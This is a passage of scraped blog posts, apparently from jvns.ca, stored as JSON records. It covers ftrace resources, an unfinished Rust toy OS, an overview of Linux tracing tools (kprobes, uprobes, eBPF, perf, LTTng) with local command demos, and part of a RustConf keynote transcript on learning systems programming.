use\nftrace to give you information about various things like IO latency. They’re\nall in his  perf-tools  repository\non GitHub. \n\n The tradeoff here is that they’re easier to use, but you’re limited to\nthings that Brendan Gregg thought of & decided to make a tool for. Which is a\nlot of things! :) \n\n Another tool for visualizing the output of ftrace better is\n kernelshark . I haven’t played with it much\nyet but it looks useful. You can install it with  sudo apt-get install\nkernelshark . \n\n a new superpower \n\n I’m really happy I took the time to learn a little more about ftrace today!\nLike any kernel tool, it’ll work differently between different kernel versions,\nbut I hope that you find it useful one day. \n\n an index of ftrace articles \n\n Finally, here’s a list of a bunch of ftrace articles I found. Many of them are on\nLWN (Linux Weekly News), which is a pretty great source of writing on Linux. (you can buy a\n subscription !) \n\n \n Debugging the kernel using Ftrace - part 1  (Dec 2009, Steven Rostedt) \n Debugging the kernel using Ftrace - part 2  (Dec 2009, Steven Rostedt) \n Secrets of the Linux function tracer  (Jan 2010, Steven Rostedt) \n trace-cmd: A front-end for Ftrace  (Oct 2010, Steven Rostedt) \n Using KernelShark to analyze the real-time scheduler  (2011, Steven Rostedt) \n Ftrace: The hidden light switch  (2014, Brendan Gregg) \n the kernel documentation: (which is quite useful)  Documentation/ftrace.txt \n documentation on events you can trace  Documentation/events.txt \n some docs on ftrace design for linux kernel devs (not as useful, but interesting)  Documentation/ftrace-design.txt \n \n\n"},
{"url": "https://jvns.ca/blog/2014/03/21/my-rust-os-will-never-be-finished/", "title": "My Rust OS will never be finished (and it's a success!)", "content": "\n      In November/December last year, I spent 3 weeks working on a toy\noperating system in Rust. (for more, see\n Writing an OS in Rust in tiny steps ,\nand  more ). \n\n I wrote a ton of blog posts about it, and I gave a talk about the\nprocess at Mozilla last week\n( the video ). At\nthat talk, a few people asked me if I was going to finish the project.\nI said no, and here’s why. \n\n There are lots of reasons for working on programming projects. Just a\nfew: \n\n \n to end up with useful code \n to learn something \n to explore a new concept (see: Bret Victor’s demos) \n \n\n The reason I wrote an operating system in Rust wasn’t so that I could\nhave an operating system written in Rust.\n\nI already have an kernel on\nmy computer (Linux), and other people have already written Rust\noperating systems better than I have. Any code that I write in 3 weeks\nis at best a duplication of someone else’s work, and mimicking\nthe state of the art 20 years ago. \n\n I worked on that project to learn about how operating systems work,\nand that was a huge success. I read a 20-part essay about linkers, and\nlearned about virtual memory, how executables are structured, how\nprogram execution works, how system calls work, the x86 boot process,\ninterrupt handlers, keyboard drivers, and a ton of other things. \n\n Another amazing example of a project like this is\n @kellabyte ’s\n Haywire , a HTTP server in C\nshe wrote to learn more about writing performant code. It actually\ncompiles and you can benchmark it yourself, but her blog posts are\nmore useful to me than her code –\n Hello haywire \n HTTP response caching in Haywire ,\n Further reducing memory allocations and use of string functions in Haywire . \n\n So when people ask me why my code doesn’t compile, it’s because the\ncode is basically a trivial output of the process. The\n blog posts I wrote  are\n much  more important, because they talk about what I learned. My code\nprobably won’t be useful to you – it would be better to start with\n rustboot  and take your own\npath. \n\n Not finishing your project doesn’t mean it’s not a success. It depends\nwhat your goals are the for the project! I wrote an operating system\nin Rust to learn, and I learned a ton. It’s not finished, and it won’t\nbe. How could it ever be? I hope to not ever finish learning. \n"},
{"url": "https://jvns.ca/blog/2017/07/05/linux-tracing-systems/", "title": "Linux tracing systems & how they fit together", "content": "\n     \n\n I’ve been confused about Linux tracing systems for  years . There’s strace, and\nltrace, kprobes, and tracepoints, and uprobes, and ftrace, and perf, and eBPF, \nand how does it all fit together and what does it all MEAN? \n\n Last week I went to Papers We Love and later me & Kamal hung out with \n Suchakra  at  Polytechnique Montréal  (where LTTng comes from) and \nfinally I think I understand how all these pieces fit together, more or less.\nThere are still probably some mistakes in this post, please let me know what\nthey are! (I’m b0rk on twitter). \n\n I’m going to leave strace out of this post (even though it’s my favorite thing)\nbecause the overhead is so high – in this post we’re only going to talk about\ntracing systems that are relatively fast / low overhead.  This post also isn’t\nabout sampling profilers at all (which is a whole other topic!). Just tracing. \n\n The thing I learned last week that helped me really understand was – you can\nsplit linux tracing systems into  data sources  (where the tracing data comes\nfrom),  mechanisms for collecting data for those sources  (like “ftrace”)\nand  tracing frontends  (the tool you actually interact with to\ncollect/analyse data). The overall picture is still kind of fragmented\nand confusing, but it’s at least a more approachable\nfragmented/confusing system. \n\n here’s what we’ll talk about: (with links if you want to jump to a specific section). \n\n \n summary in pictures \n What can you trace? \n Data sources :\n\n \n kprobes \n uprobes \n Tracepoints \n lttng-ust \n USDT / dtrace probes \n \n Mechanisms for collecting your delicious data :\n\n \n ftrace \n perf_events \n eBPF \n sysdig \n Systemtap kernel module \n LTTng \n \n User frontends :\n\n \n perf \n Various ftrace frontends  (trace-cmd, catapult, kernelshark,  perf-tools ) \n The bcc frontend for eBPF \n LTTng & SystemTap frontends \n \n some conclusions \n \n\n It’s still kind of complicated but breaking it up this way really helps me\nunderstand (thanks to Brendan Gregg for suggesting this breakdown on twitter!) \n\n \n\n a picture version \n\n here are 6 drawings summarizing what this post is about: \n\n \n \n \n \n \n \n \n \n\n \n\n What can you trace? \n\n A few different kinds of things you might want to trace: \n\n \n System calls \n Linux kernel function calls (which functions in my TCP stack are being called?) \n Userspace function calls (did  malloc  get called?) \n Custom “events” that you’ve defined either in userspace or in the kernel \n \n\n All of these things are possible, but it turns out the tracing landscape is actually pretty complicated. \n\n \n\n Data sources: kprobes, tracepoints, uprobes, dtrace probes & more \n\n Okay, let’s do data sources! This is kind of the most fun part – there are so many EXCITING PLACES you can get data about your programs. \n\n I’m going to split these up into “probes” (kprobes/uprobes) and “tracepoints” (USDT/kernel tracepoints / lttng-ust). I’m think I’m not using the right terminology exactly but there are 2 distinct ideas here that are useful to understand \n\n A  probe  is when the kernel dynamically modifies your assembly program at\nruntime (like, it changes the instructions) in order to enable tracing. This is\nsuper powerful (and kind of scary!) because you can enable a probe on literally\nany instruction in the program you’re tracing. (though dtrace probes aren’t\n“probes” in this sense). Kprobes and uprobes are examples of this pattern. \n\n A  tracepoint  is something you compile into your program. When someone using\nyour program wants to see when that tracepoint is hit and extract data, they\ncan “enable” or “activate” the tracepoint to start using it. Generally a\ntracepoint in this sense doesn’t cause any extra overhead when it’s not\nactivated, and is relatively low overhead when it is activated. USDT (“dtrace\nprobes”), lttng-ust, and kernel tracepoints are all examples of this pattern. \n\n \n kprobes \n\n Next up is kprobes! What’s that?  From an LWN article : \n\n \n KProbes are a debugging mechanism for the Linux kernel which can also be used\nfor monitoring events inside a production system. You can use it to weed out\nperformance bottlenecks, log specific events, trace problems etc. \n \n\n To reiterate – basically kprobes let you dynamically change the Linux kernel’s\nassembly code at runtime (like, insert extra assembly instructions) to trace\nwhen a given instruction is called. I usually think of kprobes as tracing Linux\nkernel function calls, but you can actually trace  any instruction inside the\nkernel and inspect the registers . Weird, right? \n\n Brendan Gregg has a  kprobe  script  that you can use to play around with kprobes. \n\n For example! Let’s use kprobes to spy on which files are being opened on our computer. I ran \n\n $ sudo ./kprobe 'p:myopen do_sys_open filename=+0(%si):string' \n \n\n from the examples and right away it started printing out every file that was being opened on my computer. Neat!!! \n\n You’ll notice that the kprobes interface by itself is a little gnarly though – like, you have to know that the filename argument to  do_sys_open  is in the  %si  register and dereference that pointer and tell the kprobes system that it’s a string. \n\n I think kprobes are useful in 3 scenarios:\n1. You’re tracing a system call. System calls all have  corresponding kernel functions like  do_sys_open \n2. You’re debugging some performance issue in the network stack or to do with file I/O and you understand the kernel functions that are called well enough that it’s useful for you to trace them (not impossible!!! The linux kernel is just code after all!)\n3. You’re a kernel developer,or you’re otherwise trying to debug a kernel bug, which happens sometimes!! (I am not a kernel developer) \n\n \n uprobes \n\n Uprobes are kind of like kprobes, except that instead of instrumenting a  kernel  function you’re instrumenting  userspace  functions (like malloc).  brendan gregg has a good post from 2015 . \n\n My understanding of how uprobes work is: \n\n \n You decide you want to trace the  malloc  function in libc \n You ask the linux kernel to trace malloc for you from libc \n Linux goes and finds the copy of libc that’s loaded into memory (there should be just one, shared across all processes), and changes the code for  malloc  so that it’s traced \n Linux reports the data back to you somehow (we’ll talk about how “asking linux” and “getting the data back somehow” works later) \n \n\n This is pretty cool! One example of a thing you can do is spy on what people are typing into their bash terminals \n\n bork@kiwi~/c/perf-tools> sudo ./bin/uprobe 'r:bash:readline +0($retval):string' \nTracing uprobe readline (r:readline /bin/bash:0x9a520 +0($retval):string). Ctrl-C to end. \n            bash-10482 [002] d...  1061.417373: readline: (0x42176e <- 0x49a520) arg1=\"hi\" \n            bash-10482 [003] d...  1061.770945: readline: (0x42176e <- 0x49a520) arg1=(fault)\n            bash-10717 [002] d...  1063.737625: readline: (0x42176e <- 0x49a520) arg1=\"hi\" \n            bash-10717 [002] d...  1067.091402: readline: (0x42176e <- 0x49a520) arg1=\"yay\" \n            bash-10717 [003] d...  1067.738581: readline: (0x42176e <- 0x49a520) arg1=\"wow\" \n            bash-10717 [001] d...  1165.196673: readline: (0x42176e <- 0x49a520) arg1=\"cool-command\" \n \n\n \n USDT/dtrace probes \n\n USDT stands for “Userland Statically Defined Tracing”, and “USDT probe” means the same thing as “dtrace probe” (which was surprising to me!). You might have heard of dtrace on BSD/Solaris, but you can actually also use dtrace probes on Linux, though the system is different. It’s basically a way to expose custom events. For example!  Python 3 has dtrace probes , if you compile it right. \n\n python.function.entry(str filename, str funcname, int lineno, frameptr) \n\n This means that if you have a tool that can consume dtrace probes, (like eBPF / systemtap), and a version of Python compiled with dtrace support, you can automagically trace Python function calls. That’s really cool! (though this is a little bit of an “if” – not all Pythons are compiled with dtrace support, and the version of Python I have in Ubuntu 16.04 doesn’t seem to be) \n\n How to tell if you have dtrace probes , from  the Python docs . Basically you poke around in the binaries with readelf and look for the string “stap” in the notes. \n\n $ readelf -S ./python | grep .note.stapsdt \n[30] .note.stapsdt        NOTE         0000000000000000 00308d78 \n# sometimes you need to look in the .so file instead of the binary \n$ readelf -S libpython3.3dm.so.1.0 | grep .note.stapsdt \n[29] .note.stapsdt        NOTE         0000000000000000 00365b68 \n$ readelf -n ./python \n \n\n If you want to read more about dtrace you can read  this paper from 2004  but I’m not actually sure what the best reference is. \n\n \n kernel tracepoints \n\n Tracepoints are also in the Linux kernel. (here’s an  LWN article ). The system was written by Mathieu Desnoyers (who’s from Montreal! :)). Basically there’s a  TRACE_EVENT  macro that lets you define tracepoints like this one (which has something to do with UDP… queue failures?): \n\n TRACE_EVENT(udp_fail_queue_rcv_skb, \n           TP_PROTO(int rc, struct sock *sk), \n        TP_ARGS(rc, sk), \n        TP_STRUCT__entry( \n                __field(int, rc) \n                __field(__u16, lport) \n        ), \n…. \n \n\n I don’t really understand how it works (I think it’s pretty involved) but basically tracepoints: \n\n \n Are better than kprobes because they stay more constant across kernel versions (kprobes just depend on whatever code happens to be in the kernel at that time) \n Are worse than kprobes because somebody has to write them explicitly \n \n\n lttng-ust \n\n I don’t understand LTTng super well yet but – my understanding is that all of the 4 above things (dtrace probes, kprobes, uprobes, and tracepoints) all need to go through the kernel at some point.  lttng-ust  is a tracing system that lets you compile tracing probes into your programs, and all of the tracing happens in userspace. This means it’s faster because you don’t have to do context switching. I’ve still used LTTng 0 times so that’s mostly all I’m going to say about that. \n\n \n\n Mechanisms for collecting your delicious delicious data \n\n To understand the frontend tools you use to collect & analyze tracing data, it’s important to understand the fundamental mechanisms by which tracing data gets out of the kernel and into your grubby hands. Here they are. (there are just 5! ftrace, perf_events, eBPF, systemtap, and lttng). \n\n Let’s start with the 3 that are actually part of the core Linux kernel: ftrace, perf_events, and eBPF. \n\n \n ftrace \n\n Those  ./kprobe  and  ./uprobe  scripts up there? Those both use  ftrace  to get data out of the kernel. Ftrace is a kind of janky interface which is a pain to use directly. Basically there’s a filesystem at  /sys/kernel/debug/tracing/  that lets you get various tracing data out of the kernel. \n\n The way you fundamentally interact with ftrace is\n1. Write to files in  /sys/kernel/debug/tracing/ \n2. Read output from files in  /sys/kernel/debug/tracing/ \n\n Ftrace supports:\n* Kprobes\n* Tracepoints\n* Uprobes \n* I think that’s it. \n\n Ftrace’s output looks like this and it’s a pain to parse and build on top of: \n\n             bash-10482 [002] d...  1061.417373: readline: (0x42176e <- 0x49a520) arg1=\"hi\" \n            bash-10482 [003] d...  1061.770945: readline: (0x42176e <- 0x49a520) arg1=(fault) \n            bash-10717 [002] d...  1063.737625: readline: (0x42176e <- 0x49a520) arg1=\"hi\" \n            bash-10717 [002] d...  1067.091402: readline: (0x42176e <- 0x49a520) arg1=\"yay\" \n            bash-10717 [003] d...  1067.738581: readline: (0x42176e <- 0x49a520) arg1=\"wow\" \n            bash-10717 [001] d...  1165.196673: readline: (0x42176e <- 0x49a520)  \n \n\n \n perf_events \n\n The second way to get data out of the kernel is with the  perf_event_open  system call. The way this works is: \n\n \n You call the  perf_event_open  system call \n The kernel writes events to a ring buffer in user memory, which you can read from \n \n\n As far as I can tell the only thing you can read this way is tracepoints. This is what running  sudo perf trace  does (there’s a tracepoint for every system call) \n\n \n eBPF \n\n eBPF is a VERY EXCITING WAY to get data. Here’s how it works. \n\n \n You write an “eBPF program” (often in C, or likely you use a tool that generates that program for you). \n You ask the kernel to attach that probe to a kprobe/uprobe/tracepoint/dtrace probe \n Your program writes out data to an eBPF map / ftrace / perf buffer \n You have your precious precious data! \n \n\n eBPF is cool because it’s part of Linux (you don’t have to install any kernel modules) and you can define your own programs to do any fancy aggregation you want so it’s really powerful. You usually use it with the  bcc  frontend which we’ll talk about a bit later. It’s only available on newer kernels though (the kernel version you need depends on what data sources you want to attach your eBPF programs to) \n\n Different eBPF features are available at different kernel versions,\nhere’s a slide with an awesome summary: \n\n \n \n\n \n sysdig \n\n Sysdig is a kernel module + tracing system. It lets you trace system calls and maybe some other things? I find their site kind of confusing to navigate, but I think  this file  contains the list of all the events sysdig supports. So it will tell you what files are being opened but not the weird internal details of what your TCP stack is doing. \n\n \n systemtap \n\n I’m a little fuzzy how SystemTap works so we’re going to go from this  architecture document \n\n \n You decide you want to trace a kprobe \n You write a “systemtap program” & compile it into a kernel module \n That kernel module, when inserted, creates kprobes that call code from your kernel module when triggered (it calls  register_kprobe ) \n You kernel modules prints output to userspace (using  relayfs or something ) \n \n\n SystemTap supports:\n* tracepoints\n* kprobes\n* uprobes\n* USDT \n\n Basically lots of things! There are some more useful words about systemtap in  choosing a linux tracer \n\n \n LTTng \n\n LTTng  (linux tracing: the next generation)  is from Montreal (a lab at ecole polytechnique)!! which makes me super happy (montreal!!). I saw an AMAZING demo of tool called  trace compass  the other day that reads data that comes from LTTng. Basically it was able to show all the  sched_switch  transitions between programs and system calls when running  tar -xzf somefile.tar.gz , and you could really see exactly what was happening in a super clear way. \n\n The downside of LTTng (like SystemTap) is that you have to install a kernel module for the kernel parts to work. With  lttng-ust  everything happens in userspace and there’s no kernel module needed. \n\n \n\n Frontends \n\n Okay! Time for frontends! I’m going to categorize them by mechanism (how the data gets  out of the kernel) to make it easier \n\n \n perf frontends \n\n The only frontend here is  perf , it’s simple. \n\n perf trace  will trace system calls for you, fast. That’s great and I love it.  perf trace  is the only one of these I actually use day to day right now. (the ftrace stuff is more powerful and also more confusing / difficult to use) \n\n \n ftrace frontends \n\n Ftrace is a pain to use on its own and so there are various frontend tools to help you. I haven’t found the best thing to use yet but here are some starting points: \n\n \n trace-cmd  is a frontend for ftrace, you can use it to collect and display ftrace data. I wrote about it a bit in  this blog post  and there’s an  article on LWN  about it \n Catapult  lets you analyze ftrace output. It’s for Android / chrome performance originally but you can also just analyze ftrace. So far the only thing I’ve gotten it to do is graph  sched_switch  events so you know which processes were running at what time exactly, and which CPU they were on. Which is pretty cool but I don’t really have a use for yet? \n kernelshark  consumes ftrace output but I haven’t tried it yet \n The  perf  command line tool is a perf frontend and (confusingly) also a frontend for some ftrace functionality (see  perf ftrace ) \n \n\n \n eBPF frontends: bcc \n\n The only I know of is  the  bcc  framework:  https://github.com/iovisor/bcc . It lets you write eBPF programs, it’ll insert them into the kernel for you, and it’ll help you get the data out of the kernel so you can process it with a Python script. It’s pretty easy to get started with. \n\n If you’re curious about the relationship between eBPF and the BPF you use in\ntcpdump I wrote a  post about eBPF & its relationship with BPF for packet filtering the other day .\nI think it might be easiest though to think of them as unrelated because eBPF\nis so much more powerful. \n\n bcc is a bit weird because you write a C program inside a Python program but\nthere are a lot of examples. Kamal and I wrote a program with bcc the other day\nfor the first time and it was pretty easy. \n\n \n LTTng & SystemTap frontends \n\n LTTng & SystemTap both have their own sets of tools that I don’t really understand. THAT SAID – there’s this cool graphical tool called  Trace Compass  that seems really powerful. It consumes a trace format called CTF (“common trace format”) that LTTng emits. \n\n \n\n what tracing tool should I use though \n\n Here’s kind of how I think about it right now (though you should note that I only just figured out how all this stuff fits together very recently so I’m not an expert): \n\n \n if you’re mostly interested in computers running kernels > linux 4.9,\nprobably just learn about eBPF \n perf trace  is good, it will trace system calls with low overhead and it’s super simple, there’s not much to learn. A+. \n For everything else, they’re, well, an investment, they take time to get used to. \n I think playing with kprobes is a good idea (via eBPF/ftrace/systemtap/lttng/whatever, for me right now ftrace is easiest). Being able to know what’s going on in the kernel is a good superpower. \n eBPF is only available in kernel versions above 4.4, and some features only above 4.7. I think it makes sense to invest in learning it but on older systems it won’t help you out yet \n ftrace is kind of a huge pain, I think it would be worth it for me if I could find a good frontend tool but I haven’t managed it yet. \n \n\n I hope this helped! \n\n I’m really excited that now I (mostly) understand how all these pieces fit together, I am literally typing some of this post at a free show at the jazz festival and listening to blues and having a fun time. \n\n Now that I know how everything fits together, I think I’ll have a much easier time navigating the landscape of tracing frontends! \n\n Brendan Gregg ’s awesome\nblog discusses a ton of these topics in a lot of detail – if you’re interested\nin hearing about improvements in the Linux tracing ecosystem as they happen\n(it’s always changing!), that’s the best place to subscribe. \n\n thanks to Annie Cherkaev, Harold Treen, Iain McCoy, and David\n Turner for reading a draft of this. \n\n"},
{"url": "https://jvns.ca/blog/2016/01/10/why-i-rust/", "title": "Why I ❤ Rust", "content": "\n      I gave a talk about why I like Rust a while ago! There’s no video. Normally my\ntalk slides are unremarkable and I don’t post them, but I think these mostly stand on their own and I’m happy with how they turned out.  Here it is (and it’s embedded below) . \n\n \n\n"},
{"url": "https://jvns.ca/blog/2016/09/11/rustconf-keynote/", "title": "Learning systems programming with Rust", "content": "\n     \n\n \n\n.container {\n    display: flex;\n}\n.slide {\n    width: 40%;\n}\n.content {\n    width: 60%;\n    align-items: center;\n    padding: 20px;\n}\n\n@media (max-width: 480px) { /*breakpoint*/\n    .container {\n        display: block;\n    }\n    .slide {\n        width: 100%;\n    }\n    .content {\n        width: 100%;\n}\n\n \n\n I did the closing keynote at the first RustConf yesterday, on Rust and systems\nprogramming and accessibility and learning about concurrency and why I write\nabout programming and a bunch of other things. \n\n I was really delighted to be invited because I’m a huge fan of the Rust\ncommunity. They’re working incredibly hard to make a language that is\nextremely powerful, but also easy to use, and there was a huge focus on\nusability and good error messages. The talks were really ambitious, friendly,\nand inclusive. Their challenge is “Fast, safe, productive – pick three” :). \n\n Here’s a video & transcript of that talk (where when I say “transcript” I mean “more\nless what I said, kinda”). \n\n video \n\n \n\n transcript \n\n You can click on any of the slides to see a big version. \n\n I drew the slides with  this Samsung tablet , and Powerpoint for android. These were the easiest slides I’ve ever made. \n\n \n \n \n \n \n\n \n \n\n \n \n \n \n \n\nThese are the 4 themes I want to talk about in this talk! Let's go.\n\n \n \n\n \n \n \n \n \n\nA lot of people love Rust for these 3 reasons. And more! memory safety without garbage collection! These are great reasons to love Rust.\n\n \n \n\n \n \n \n \n \nBut that's not why I love Rust. I'm kind of a beginner Rust programmer, my understanding of the borrow checker is flaky, I've written maybe 1000 lines of Rust code, and I'm not writing any production Rust code.\n\n \nI spend a lot of my time on a comet very far away from Rust. So why am I talking to you right now?\n \n \n\n \n \n \n \n \n\n\nI care a lot about learning about systems, and I've spent a lot of my time doing that. I love doing experiments with programming, and I think Rust is a super good platform for experiments. And the community has helped me out!\n\n \n \n\n \n \n \n \n \n\nWhen Aaron invited me to give this talk (which was, like, the best day ever), he wrote\n\n \n\"We see the language as empowering for a wide variety of people who\nmight not otherwise consider themselves systems programmers.\"\n \n\nAnd the person who doesn't consider themselves as a systems programmer! That has TOTALLY BEEN ME. So let's talk about experiments and empowerment.\n\n \n \n\n \n \n \n \n \n\n \n \n\n \n \n \n \n \n\nI do a lot of programming experiments to learn more about programming. My goal with these experiments usually isn't to produce anything of value. Instead I just want to learn something!\n\n \n \n\n \n \n \n \n \n\nIn 2013, I'd been working as a programmer for 2 years, I had 2 CS degrees, and I knew all kinds of things about computer science. But there was still SO MUCH I didn't know.\n\n \n \n\n \n \n \n \n \n\nIn particular, I didn't know anything really about how the Linux kernel worked, even though I'd been using Linux for 8 years. I think I'd never heard the words \"system call\".\n\n \n \n\n \n \n \n \n \n\n \n \nSo I went to the Recurse Center! RC is a 12-week programming retreat in New York where you go to learn whatever you want about programming. \n\n \nIt's totally self-directed, and while I was there I ended up spending a lot of time learning about operating systems, because that was the most confusing thing I could find to work on.\n \n\n \n \n\n \n \n \n \n \n\nOn my  third day   at RC, I learned what the Linux kernel does! I found out what a system call is! \n\n \nIt turns out it had a pretty simplex explanation -- your operating system knows how to do things like open files, you program does not, so your program asks your operating system to do things with system calls! Like `open`.\n \n\n \n \n\n \n \n \n \n \n\nThree weeks before the end of my time there, I decided to write an operating system. Lindsey Kuper suggested I try Rust, which I was also a beginner at, so I tried that!\n\n \n \n\n \n \n \n \n \n \nIt turns out that writing an operating system in 3 weeks is actually impossible (at least for me!), so I reduced my scope a lot -- I decided to just write a keyboard driver from scratch. So my goal was, when I typed a key on my keyboard, that key would appear on my screen!\n \n \nTurns out that this is not at all trivial.\n \n\n \n \n\n \n \n \n \n \n\n \nSo, one of the themes for this talk was \"you can contribute without coding\". I\nreally believe in this -- I think that code contributions are great, don't get\nme wrong.\n \n\n \nBut I have basically never contributed code to an open source\nproject (even though I'm a programmer!) and I think I've contributed a lot to\nopen source communities.\n \n\n \n \n\n \n \n \n \n \n\n \nWhen I started doing this I discovered a really surprising thing. At the time I was writing blog posts every day about what I'd learned that day.\n \n\n \nAnd even though I was a beginner to both Rust and operating systems development, it turned out that some of these blog posts were really popular! People were learning from them!\n \n\n I wrote buzzfeed-style posts like \"12 things I learned today about linkers\",  After 5 days, my OS doesn't crash when I press a key ,  How to run a simple ELF executable, from scratch (I don't know) , and a lot more.\n \n\n \nSo this is interesting, right! To teach people it turns out you don't have to be an expert at all. Maybe it's actually even better to be a beginner!\n \n\n \n \n\n \n \n \n \n \n\nNiko made this comment \"if it's not documented, it might as well not exist\" in his keynote this morning. And I think this is really true. If there's an amazing program in the world, but you don't know about it.\n\n \n \n\n \n \n \n \n \n\n \nMy friend Maya jokes that I'm basically developer relations for strace.\n \n\n \nThis happened because in 2013, someone told me about strace, a program I love that traces system calls. And I was so shocked that I hadn't known about it before! So I started telling everyone.\n \n\n \nAnd now all kinds of people know about strace because of me, and they have a new useful tool! So that basically makes me the inventor of strace for those people, right? :)\n \n\n \nI like doing this in my spare time because I write code at work, so it's a really nice change of pace.\n \n \n \n\n \n \n \n \n \n\n \nWriting code is a lot of work. And when you write the code, if you want people to use it, it's a lot of work to tell people about it!\n \n\n \nSo I like to skip the whole first step of writing code, and just tell people about awesome things that already exist. I'm like the most productive software developer ever.\n \n \n \n\n \n \n \n \n \n\n \nLet's switch gears and talk about learning systems programming.\n \n \nMy coworker asked me the other day \"I'm reading a book about Rust, what would be a good example program to write?\". And this is a hard question to answer!\n \n \nSo here's a possible answer to that question. I think it's important to have a lot of answers like this, because there's so much to learn!\n \n \n \n\n \n \n \n \n \n\n \nSo one evening, I was at home, and I wanted to know more about concurrency.\n \n \n \n\n \n \n \n \n \n\n \nBut this isn't a very specific question! A better question is -- what are the systems primitives for concurrency?\n \n \nI knew that a lot of concurrent programs used the same kind of functions and ideas and systems calls. So what were those things, and how did they work?\n \n \nMany concurrent programs use operating systems threads, they need to control access to resources with mutexes, and sometimes they do these \"atomic instruction\" things.\n \n\n \n \n\n \n \n \n \n \n \nMy favorite way to start out exploring idea is to write a program that doesn't work.\n \n\n \nIt's easy to write unsafe programs in C, so I did it in C. I made 1000 threads that each incremented the same counter 1000 times. You should get 100000 at the end, right?\n \n\n \n \n\n \n \n \n \n \n \nNope! Instead we get a data race! The answer is way less than a million. This is great! I was very happy already because I'd made a race and it worked. \n \n\n \n \n\n \n \n \n \n \n \nSo one of the first ways to work on concurrency is mutexes, or locks. You and all the other threads have one place where you go to control who's allowed to update the counter.\n \n \nI like this as a simple example because you can just get it to work and move on, or, if you want, you can go a lot deeper.\n \n \nFor example! To use mutexes, underneath you often use a function called pthread_mutex_lock. And it turns out that sometimes that uses the futex system call, and sometimes it doesn't! So there's all kinds of hidden complexity.\n \n\n \n \n\n \n \n \n \n \n \nThe next thing I want to talk about is atomic instructions. Basically your CPU knows how to increment counters without races -- if you say \"lock inc\" then it will make sure that the counter gets incremented exactly once.\n \n\n \n \n\n \n \n \n \n \n \nSo now we have a nice small exercise! This is not really that hard to do in Rust, but it introduces a lot of new ideas.\n \n \nAnd there are a lot of opportunities for questions, right? Like, are mutexes or atomics faster? How much? Why? I love problems that you can finish pretty easily, but take farther if you want.\n \n\n \n \n\n \n \n \n \n \n \nNow we're onto the last part of the talk.\n \n \nI originally wrote \"impossible problems\" here. But of course all programs are technically *possible* to write!\n \n \nAs we're going to learn shortly, though, right now I really do not know C, and I have a day job, and so my free time for programming is not unlimited. So even if a program is *possible* for me to write, if I have to write it in C/C++, probably in practice it's not going to happen.\n \n \nI'm going to tell you about how Rust helped me write a program that I wanted to write, that would have been improbable otherwise.\n \n\n \n \n\n \n \n \n \n \n \nThis where we get back to EMPOWERMENT.\n \n \n \n\n \n \n \n \n \n\n \nSo, here's the problem I was mad about. I'd run \"top\" on my computer, and it would tell me Ruby was using all the CPU, and I wouldn't know why.\n \n \n \n\n \n \n \n \n \n \nAnd the reason this made me mad, is that I could see what other programs like Chrome were doing with   perf top \n \n \n(cool demo of perf top goes here)\n \n\n \n \n\n \n \n \n \n \n \nSo I wanted to write a program that I could just give the PID of a Ruby process, and it would tell me the top Ruby functions that were running right now.\n \n \nIs that possible? My friend Julian claimed this was totally possible and easy. So eventually I decided to try.\n \n\n \n \n\n \n \n \n \n \n \nTo do this from the outside, you have to basically spy on the internals of a running Ruby process.\n \n \nThe system call I used to spy is called process_vm_readv.\n \n\n \n \n\n \n \n \n \n \n \nIn the Ruby interpreter, you have the C stack. That has unhelpful things on it like \"you're in vm_exec right now\" which basically means \"you're running a Ruby function\"\n \n \nBUT WHICH RUBY FUNCTION?!\n \n \nBut somewhere inside its memory, somewhere, you have the Ruby stack. That's what I wanted to get at.\n \n\n \n \n\n \n \n \n \n \n \nI'm not going to go into the details of how this works because I don't have time, but I wrote a C demo of this program. I know how to write C! I can allocate memory in C! My demo kinda worked!\n \n \nHowever, I do not really know how to *free* memory in C. Like, I technically know that there is a free function, but I don't have a lot of experience with it. So my program had some pretty serious memory issues almost right away.\n \n\n \n \n\n \n \n \n \n \n \nAt this point I asked my partner Kamal for some help translating my program to Rust.\n \n \nAt the time I used bindgen and it was awesome, it took maybe a day, and now I had a Rust program that did the same thing! Except I didn't have to know how to free memory anymore.\n \n\n \n \n\n \n \n \n \n \n \nIf you observe this highly scientific graph of \"program workingness\", you will see that my productivity went up.\n \n \nI had to fight with the compiler a lot more, but I did not have to learn how to implement hashmaps from scratch. Win.\n \n\n \n \n\n \n \n \n \n \n \nBut I had one more problem. It turned out that I needed to know what the bytes in memory in my Ruby program *meant*. I wanted to know what the original struct definitions were so I could interpret all these 0s and 1s.\n \n \n \n\n \n \n\n \n \n \n \n \n \nLuckily, sometimes the C compiler will save a bunch of debug information in a format called DWARF.\n \n \nThis basically has all the structs and saves them inside your programs! Yay! This is the best! I had hope again.\n \n\n \n \n\n \n \n \n \n \n \nI needed a library for parsing DWARF, though. I started with trying libdwarf, and I got it maybe 90% working. But it was sort of a terrible experience.\n \n \nThe API was terrible, there were no docs that I could find, it was slow, I had a bad time linking the library into my Rust program.\n \n \nOne of the most upsetting things to me about this library is that it was really hard to understand how DWARF actually worked by looking at the interfaces it provided. I like knowing how things work.\n \n \n \n\n \n \n \n \n \n \nA lot of the time when I have programming problems, I complain about them on Twitter. Somebody suggested I try a Rust library called 'gimli'.\n \n \nOne of the maintainers, Nick Fitzgerald, told me it wasn't done but he thought it might have all the features I needed! GREAT.\n \n\n \n \n\n \n \n \n \n \n \nUsing Gimli was a way better experience. It didn't have too much documentation either, but that was okay -- the example program they provided was really helpful, and explained how to do basically everything I needed to do.\n \n \nThe only thing it didn't do that I wanted was really small, and I submitted a tiny pull request to get it.\n \n \nAnd the maintainers were really helpful! I understood DWARF better after I started working with Gimli.\n \n\n \n \n\n \n \n \n \n \n \n\"How does DWARF work\" is a question pretty far out of the scope of this talk, but basically if your program is a train car (made of a bunch of ELF section), DWARF debug info is basically just a bunch of extra train cars tacked on to the end. One of the sections just basically has all the strings in your program concatenated together!\n \n \n \n\n \n \n\n \n \n \n \n \n \nSo, after this whole saga, we did it!! I worked on this a lot with Kamal and our ruby stacktrace program worked! It's  on github  and everything. It works on 3 computers.\n \n \n(insert cool demo here)\n \n\n \n \n\n \n \n \n \n \n \nI spend a lot of time being frustrated with the Rust compiler, but I still like it because it lets me do things I probably wouldn't get done otherwise.\n \n\n \n \n\n \n \n \n \n \n \nI want to leave you with a few things.\n \n \nOne delightful thing about systems is that there's always SO MUCH MORE TO LEARN. I don't think there's any danger of any of knowing everything about systems programming any time soon.\n \n\n \n \n\n \n \n \n \n \n \nI'm pretty sure all of you know cool things about programming that I don't know. If you like writing, this can be a great way to make the community around you know more!\n \n\n \n \n\n \n \n \n \n \n \nOne thing I really want to emphasize is -- I see a ton of resources for beginners, and I think those are really awesome.\n 